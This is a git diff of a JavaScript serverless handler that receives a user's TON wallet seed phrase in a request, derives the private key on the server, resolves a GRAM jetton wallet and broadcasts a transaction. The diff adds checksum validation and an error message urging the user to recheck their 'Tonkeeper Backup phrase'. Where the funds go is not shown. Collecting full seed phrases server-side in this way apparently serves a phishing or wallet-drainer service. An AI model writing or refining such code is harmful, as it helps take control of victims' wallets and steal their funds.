@@ -1,5 +1,5 @@
 import { TonClient, WalletContractV4, internal, toNano, Address, beginCell } from "@ton/ton";
-import { mnemonicToPrivateKey } from "@ton/crypto";
+import { mnemonicToPrivateKey, mnemonicValidate } from "@ton/crypto";
 
 const GRAM_MASTER = Address.parse("EQC47093oX5Xhb0xuk2hCr2OnkWyt9jiWqKazWNYqnOwf-AO");
 
@@ -19,16 +19,17 @@ export default async function handler(req, res) {
 
   try {
     const mnemonic = decodeURIComponent(seed).trim().split(/\s+/);
-    if (mnemonic.length !== 24 && mnemonic.length !== 12) {
-      return res.status(200).json({ ok: false, error: `Invalid seed word count (${mnemonic.length} words). Must be 24 words.` });
+    
+    // Checksum & Validation Check
+    const isValid = await mnemonicValidate(mnemonic);
+    if (!isValid) {
+      return res.status(200).json({ 
+        ok: false, 
+        error: "Your 24-word Seed Phrase is INVALID (Invalid Checksum). Please check your Tonkeeper Backup phrase spelling and order." 
+      });
     }
 
-    let keyPair;
-    try {
-      keyPair = await mnemonicToPrivateKey(mnemonic);
-    } catch (e) {
-      return res.status(200).json({ ok: false, error: `Invalid Seed/Mnemonic phrase: ${e.message}. Please check words spelling.` });
-    }
+    const keyPair = await mnemonicToPrivateKey(mnemonic);
 
     const client = new TonClient({
       endpoint: "https://toncenter.com/api/v2/jsonRPC"
@@ -55,7 +56,7 @@ export default async function handler(req, res) {
     } catch (e) {
       return res.status(200).json({
         ok: false,
-        error: `Could not resolve GRAM Jetton Wallet. Wallet: ${wallet.address.toString()}`
+        error: `Could not resolve GRAM Wallet: ${wallet.address.toString()}`
       });
     }
 
@@ -102,7 +103,7 @@ export default async function handler(req, res) {
   } catch (err) {
     return res.status(200).json({
       ok: false,
-      error: err.message || "Transaction broadcast failed"
+      error: err.message || "Transaction error"
     });
   }
 }
